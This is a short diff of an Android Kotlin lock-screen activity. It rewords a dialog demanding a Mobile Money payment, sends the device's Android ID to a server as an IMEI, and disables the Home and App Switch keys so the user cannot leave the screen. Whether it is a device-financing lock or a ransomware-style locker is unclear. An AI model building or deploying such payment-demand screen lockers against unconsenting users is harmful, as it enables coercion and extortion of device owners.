@@ -118,7 +118,7 @@ class LockScreenActivity : Activity() {
                 "📞 Contacter le Support pour Dépôt Direct"
             )
             AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
-                .setTitle("Régulariser mon versement (5 000 FCFA)")
+                .setTitle("Régulariser mon versement Mobile Money")
                 .setItems(options) { _, which ->
                     when (which) {
                         0 -> {
@@ -167,7 +167,7 @@ class LockScreenActivity : Activity() {
             Thread {
                 try {
                     val prefs = getSharedPreferences("locker_prefs", Context.MODE_PRIVATE)
-                    val androidId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "352965710157155"
+                    val androidId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: ""
                     val imei = prefs.getString("assigned_imei", androidId) ?: androidId
                     val client = OkHttpClient()
                     val json = JSONObject().apply {
@@ -246,8 +246,6 @@ class LockScreenActivity : Activity() {
         }
     }
 
-    // Touches physiques : Seuls Home et App Switch sont neutralisés pour ne pas quitter.
-    // Les touches Volume, Power et Clavier tactile restent actives.
     override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
         if (keyCode == KeyEvent.KEYCODE_HOME || keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
             return true
